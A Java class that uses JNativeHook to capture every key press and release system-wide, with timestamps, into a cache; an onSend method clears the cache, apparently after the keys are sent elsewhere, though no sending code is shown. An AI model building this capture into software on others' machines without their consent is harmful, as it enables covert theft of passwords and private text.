package main.keys;

import main.handlers.KeyStorage;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.util.ArrayList;
import java.util.List;

public class NativeKeyboard implements NativeKeyListener {
// List to store our Key Cache
    private List<KeyStorage> KeyCache = new ArrayList<>();


    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        // Getting data about the key from the user
        KeyCache.add(new KeyStorage(e.getKeyCode(),true,System.currentTimeMillis()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        KeyCache.add(new KeyStorage(e.getKeyCode(),false,System.currentTimeMillis()));

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }
    public void onSend(){
        KeyCache.clear();
    };
    public void onFail(){
        System.out.println("Recording KeyStroke Failed !");
    };

}
